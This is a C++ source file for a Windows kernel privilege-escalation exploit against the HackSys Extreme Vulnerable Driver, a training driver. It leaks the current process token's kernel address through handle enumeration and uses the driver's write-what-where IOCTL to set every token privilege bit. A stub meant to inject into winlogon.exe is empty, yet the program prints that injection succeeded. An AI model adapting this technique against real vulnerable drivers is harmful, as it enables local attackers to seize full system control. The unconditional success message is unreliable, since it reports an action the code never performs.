#include <Windows.h>
#include <Psapi.h>
#include <iostream>
#include "ntos.h"

#define HEVD_IOCTL_WRITE_WHAT_WHERE 0x0022200B

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI *_NtQueryIntervalProfile)(
    ULONG ProfileSource,
    PULONG Interval
);

typedef struct _WRITE_WHAT_WHERE {
    ULONG_PTR What;
    ULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

HANDLE GetDriverHandle()
{
    return CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       nullptr,
                       OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL,
                       nullptr);
}

PVOID LocateTokenHandle()
{
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = nullptr;
    ULONG handleInfoSize = 0x10000;
    ULONG pid = GetCurrentProcessId();
    PVOID token = nullptr;

    if (!NtQuerySystemInformation) {
        printf("[!] Failed to resolve NtQuerySystemInformation\n");
        return nullptr;
    }

    pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);

    while (NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, handleInfoSize, nullptr) == STATUS_INFO_LENGTH_MISMATCH) {
        HeapFree(GetProcessHeap(), 0, pHandleInfo);
        handleInfoSize *= 2;
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
    }

    for (ULONG i = 0; i < pHandleInfo->HandleCount; i++) {
        SYSTEM_HANDLE handle = pHandleInfo->Handles[i];

        if (handle.UniqueProcessId == pid && handle.ObjectTypeNumber == 5) {
            token = (PVOID)handle.Object;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, pHandleInfo);

    return token;
}

VOID SetTokenPrivileges(PVOID token, ULONG_PTR what)
{
    HANDLE hDriver = GetDriverHandle();
    WRITE_WHAT_WHERE writeWhatWhere;

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to obtain driver handle\n");
        return;
    }

    writeWhatWhere.What = what;
    writeWhatWhere.Where = (ULONG_PTR)token + 0x40;

    DeviceIoControl(hDriver,
                    HEVD_IOCTL_WRITE_WHAT_WHERE,
                    &writeWhatWhere,
                    sizeof(writeWhatWhere),
                    nullptr,
                    0,
                    nullptr,
                    nullptr);

    CloseHandle(hDriver);
}

VOID InjectToWinlogon()
{
    // Your implementation here.
}

int main()
{
    PVOID token = LocateTokenHandle();
    ULONG_PTR maxPrivileges = 0xFFFFFFFF;

    if (token) {
        printf("[+] Token handle located at: %p\n", token);
        SetTokenPrivileges(token, maxPrivileges);
        printf("[+] Token privileges set to maximum.\n");
        InjectToWinlogon();
        printf("[+] Injected to winlogon.exe successfully\n");

    }
    else {
        printf("[-] Failed to locate token handle\n");
    }
    
    return 0;
}

